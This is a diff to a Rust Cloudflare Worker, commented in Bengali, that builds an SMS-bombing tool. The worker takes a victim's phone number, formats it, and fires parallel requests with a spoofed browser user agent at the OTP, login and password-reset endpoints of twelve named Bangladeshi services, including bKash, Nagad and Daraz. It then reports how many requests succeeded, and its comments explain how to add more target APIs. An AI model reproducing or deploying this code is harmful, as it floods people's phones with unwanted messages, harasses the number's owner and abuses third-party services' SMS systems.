@@ -1,31 +1,44 @@
 use worker::*;
 use serde_json::{json, Value};
+use wasm_bindgen_futures::JsFuture;
+use wasm_bindgen::JsValue;
 
+// ═══════════════════════════════════════════════════
+//  CORS — wildcard, সব origin allow
+// ═══════════════════════════════════════════════════
 pub fn cors_headers() -> Headers {
-    let mut headers = Headers::new();
-    headers.set("Access-Control-Allow-Origin", "*").unwrap();
-    headers.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS").unwrap();
-    headers.set("Access-Control-Allow-Headers", "Content-Type").unwrap();
-    headers.set("Content-Type", "application/json").unwrap();
-    headers
+    let mut h = Headers::new();
+    h.set("Access-Control-Allow-Origin", "*").unwrap();
+    h.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS").unwrap();
+    h.set("Access-Control-Allow-Headers", "Content-Type").unwrap();
+    h.set("Content-Type", "application/json").unwrap();
+    h
 }
 
-async fn call_api(name: &'static str, url: &'static str, payload: Value) -> Value {
-    let mut fetch_init = RequestInit::new();
-    fetch_init.with_method(Method::Post);
-    let mut h = Headers::new();
-    h.set("Content-Type", "application/json").unwrap();
-    h.set("User-Agent", "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36").unwrap();
-    h.set("Accept", "application/json, text/plain, */*").unwrap();
-    fetch_init.with_headers(h);
-    fetch_init.with_body(Some(payload.to_string().into()));
+// ═══════════════════════════════════════════════════
+//  SINGLE API CALL — ultra fast, no blocking
+// ═══════════════════════════════════════════════════
+async fn fire(
+    name:    &'static str,  // API নাম
+    url:     &'static str,  // API URL
+    payload: Value,         // JSON body
+) -> Value {
+    let mut init = RequestInit::new();
+    init.with_method(Method::Post);
 
-    match Request::new_with_init(url, &fetch_init) {
+    let mut h = Headers::new();
+    h.set("Content-Type",  "application/json").unwrap();
+    h.set("User-Agent",    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36").unwrap();
+    h.set("Accept",        "application/json, */*").unwrap();
+    h.set("Accept-Language", "en-US,en;q=0.9").unwrap();
+    init.with_headers(h);
+    init.with_body(Some(payload.to_string().into()));
+
+    match Request::new_with_init(url, &init) {
         Ok(req) => match Fetch::Request(req).send().await {
             Ok(mut r) => {
-                let status = r.status_code();
-                let ok = status == 200 || status == 201 || status == 202;
-                json!({"api": name, "status": status, "ok": ok})
+                let s = r.status_code();
+                json!({"api": name, "status": s, "ok": s==200||s==201||s==202})
             }
             Err(_) => json!({"api": name, "status": 0, "ok": false})
         },
@@ -33,6 +46,36 @@ async fn call_api(name: &'static str, url: &'static str, payload: Value) -> Valu
     }
 }
 
+// ═══════════════════════════════════════════════════
+//  PARALLEL RUNNER — সব API একসাথে fire করে
+//  Cloudflare Workers WASM এ সবচেয়ে fast পদ্ধতি
+// ═══════════════════════════════════════════════════
+macro_rules! parallel {
+    ($($f:expr),+ $(,)?) => {{
+        let js_promises = js_sys::Array::new();
+        $(
+            js_promises.push(
+                &wasm_bindgen_futures::future_to_promise(async move {
+                    let v = $f.await;
+                    Ok(JsValue::from_str(&v.to_string()))
+                })
+            );
+        )+
+        let all = js_sys::Promise::all(&js_promises);
+        let results_js = JsFuture::from(all).await.unwrap_or(JsValue::NULL);
+        let arr = js_sys::Array::from(&results_js);
+        let mut out: Vec<Value> = Vec::new();
+        for i in 0..arr.length() {
+            let s = arr.get(i).as_string().unwrap_or_default();
+            out.push(serde_json::from_str(&s).unwrap_or(json!({"ok":false})));
+        }
+        out
+    }};
+}
+
+// ═══════════════════════════════════════════════════
+//  MAIN HANDLER
+// ═══════════════════════════════════════════════════
 pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
     let headers = cors_headers();
 
@@ -44,52 +87,91 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
     }
 
     let body: Value = req.json().await.unwrap_or_default();
-    let number = body.get("number").and_then(|v| v.as_str()).unwrap_or("").trim().to_string();
+    let number = body.get("number")
+        .and_then(|v| v.as_str())
+        .unwrap_or("").trim().to_string();
 
     if number.is_empty() {
-        return Ok(Response::ok(json!({"status":"error","message":"Number missing"}).to_string())?.with_headers(headers));
+        return Ok(Response::ok(
+            json!({"status":"error","message":"Number missing"}).to_string()
+        )?.with_headers(headers));
     }
 
-    let bd_no   = number.trim_start_matches('0').to_string();
-    let bd_full = format!("880{}", bd_no);
-    let plus_bd = format!("+88{}", number);
+    // ── Phone number formats ──
+    let bd_no   = number.trim_start_matches('0').to_string(); // 1XXXXXXXXX
+    let bd_full = format!("880{}", bd_no);                    // 8801XXXXXXXXX
+    let plus_bd = format!("+88{}", number);                   // +8801XXXXXXXXX
 
-    // সব API একসাথে fire করো — ultra fast parallel execution
-    let (r0,r1,r2,r3,r4,r5,r6,r7,r8,r9,r10,r11) = worker::js_sys::Promise::all(&[
-        wasm_bindgen_futures::future_to_promise(call_api("Shadhin Music","https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",json!({"msisdn":&bd_full,"shortcode":16235,"servicename":"Shadhin Music"}))),
-        wasm_bindgen_futures::future_to_promise(call_api("Khaodao","https://api.eat-z.com/auth/customer/app-connect",json!({"username":&plus_bd}))),
-        wasm_bindgen_futures::future_to_promise(call_api("Walton Plaza","https://waltonplaza.com.bd/api/auth/otp/create",json!({"auth":{"countryCode":"880","phone":&bd_no},"captchaToken":"recapcha"}))),
-        wasm_bindgen_futures::future_to_promise(call_api("Easy.com.bd","https://core.easy.com.bd/api/v1/forgot-password-otp",json!({"device_key":"2ea97d276a980993308116baa292cec9","mobile":&number}))),
-        wasm_bindgen_futures::future_to_promise(call_api("Chaldal","https://chaldal.com/api/OTP/GenerateOTP",json!({"phoneNumber":&plus_bd}))),
-        wasm_bindgen_futures::future_to_promise(call_api("Shajgoj","https://shajgoj.com/wp-json/cocart/v1/customer/otp",json!({"phone":&number,"type":"login"}))),
-        wasm_bindgen_futures::future_to_promise(call_api("Bkash","https://www.bkash.com/api/get-otp",json!({"mobile":&number}))),
-        wasm_bindgen_futures::future_to_promise(call_api("Nagad","https://api.mynagad.com/api/dfs/check-account",json!({"accountNumber":&bd_full}))),
-        wasm_bindgen_futures::future_to_promise(call_api("Pathao Food","https://pathao.com/api/v1/auth/otp",json!({"phone":&number,"country_code":"+880"}))),
-        wasm_bindgen_futures::future_to_promise(call_api("Shohoz","https://shohoz.com/api/v4.0/user/sendOTP",json!({"mobile_no":&number}))),
-        wasm_bindgen_futures::future_to_promise(call_api("Daraz","https://member.daraz.com.bd/user/api/v1/otp/sendOtp",json!({"mobile":&bd_full,"countryCode":"880","action":"REGISTER"}))),
-        wasm_bindgen_futures::future_to_promise(call_api("Sheba.xyz","https://sheba.xyz/api/v2/auth/otp",json!({"mobile":&number}))),
-    ]);
-    
-    // সব একসাথে চালাও
-    let futures = vec![
-        call_api("Shadhin Music","https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",json!({"msisdn":&bd_full,"shortcode":16235,"servicename":"Shadhin Music"})),
-        call_api("Khaodao","https://api.eat-z.com/auth/customer/app-connect",json!({"username":&plus_bd})),
-        call_api("Walton Plaza","https://waltonplaza.com.bd/api/auth/otp/create",json!({"auth":{"countryCode":"880","phone":&bd_no},"captchaToken":"recapcha"})),
-        call_api("Easy.com.bd","https://core.easy.com.bd/api/v1/forgot-password-otp",json!({"device_key":"2ea97d276a980993308116baa292cec9","mobile":&number})),
-        call_api("Chaldal","https://chaldal.com/api/OTP/GenerateOTP",json!({"phoneNumber":&plus_bd})),
-        call_api("Shajgoj","https://shajgoj.com/wp-json/cocart/v1/customer/otp",json!({"phone":&number,"type":"login"})),
-        call_api("Bkash","https://www.bkash.com/api/get-otp",json!({"mobile":&number})),
-        call_api("Nagad","https://api.mynagad.com/api/dfs/check-account",json!({"accountNumber":&bd_full})),
-        call_api("Pathao Food","https://pathao.com/api/v1/auth/otp",json!({"phone":&number,"country_code":"+880"})),
-        call_api("Shohoz","https://shohoz.com/api/v4.0/user/sendOTP",json!({"mobile_no":&number})),
-        call_api("Daraz","https://member.daraz.com.bd/user/api/v1/otp/sendOtp",json!({"mobile":&bd_full,"countryCode":"880","action":"REGISTER"})),
-        call_api("Sheba.xyz","https://sheba.xyz/api/v2/auth/otp",json!({"mobile":&number})),
+    // ═══════════════════════════════════════════════
+    //  API LIST — সব একসাথে parallel fire হবে
+    //
+    //  নতুন API যোগ করতে:
+    //  fire(
+    //      "API নাম",           ← name
+    //      "https://api.url",   ← url
+    //      json!({              ← body/data
+    //          "key": &number,
+    //      })
+    //  ),
+    // ═══════════════════════════════════════════════
+    let api_results = parallel![
+        // ── BD SMS APIs ──
+        fire("Shadhin Music",
+            "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
+            json!({"msisdn": &bd_full, "shortcode": 16235, "servicename": "Shadhin Music"})
+        ),
+        fire("Khaodao",
+            "https://api.eat-z.com/auth/customer/app-connect",
+            json!({"username": &plus_bd})
+        ),
+        fire("Walton Plaza",
+            "https://waltonplaza.com.bd/api/auth/otp/create",
+            json!({"auth": {"countryCode": "880", "phone": &bd_no}, "captchaToken": "recapcha"})
+        ),
+        fire("Easy.com.bd",
+            "https://core.easy.com.bd/api/v1/forgot-password-otp",
+            json!({"device_key": "2ea97d276a980993308116baa292cec9", "mobile": &number})
+        ),
+        fire("Chaldal",
+            "https://chaldal.com/api/OTP/GenerateOTP",
+            json!({"phoneNumber": &plus_bd})
+        ),
+        fire("Shajgoj",
+            "https://shajgoj.com/wp-json/cocart/v1/customer/otp",
+            json!({"phone": &number, "type": "login"})
+        ),
+        fire("Bkash",
+            "https://www.bkash.com/api/get-otp",
+            json!({"mobile": &number})
+        ),
+        fire("Nagad",
+            "https://api.mynagad.com/api/dfs/check-account",
+            json!({"accountNumber": &bd_full})
+        ),
+        fire("Pathao Food",
+            "https://pathao.com/api/v1/auth/otp",
+            json!({"phone": &number, "country_code": "+880"})
+        ),
+        fire("Shohoz",
+            "https://shohoz.com/api/v4.0/user/sendOTP",
+            json!({"mobile_no": &number})
+        ),
+        fire("Daraz",
+            "https://member.daraz.com.bd/user/api/v1/otp/sendOtp",
+            json!({"mobile": &bd_full, "countryCode": "880", "action": "REGISTER"})
+        ),
+        fire("Sheba.xyz",
+            "https://sheba.xyz/api/v2/auth/otp",
+            json!({"mobile": &number})
+        ),
+        // ── এখানে নতুন API যোগ করো ──
+        // fire("API নাম", "https://api.url", json!({"phone": &number})),
+        // fire("API নাম", "https://api.url", json!({"mobile": &bd_full})),
     ];
 
-    // Cloudflare Workers WASM এ join সবচেয়ে ভালো উপায়
-    let api_results = join_futures(futures).await;
-    
-    let success = api_results.iter().filter(|r| r["ok"].as_bool().unwrap_or(false)).count() as u32;
+    let success = api_results.iter()
+        .filter(|r| r["ok"].as_bool().unwrap_or(false))
+        .count() as u32;
     let failed = api_results.len() as u32 - success;
 
     Ok(Response::ok(json!({
@@ -100,12 +182,4 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
         "total":   success + failed,
         "results": api_results
     }).to_string())?.with_headers(headers))
-}
-
-async fn join_futures(futures: Vec<impl std::future::Future<Output = Value>>) -> Vec<Value> {
-    let mut results = Vec::new();
-    for f in futures {
-        results.push(f.await);
-    }
-    results
 }
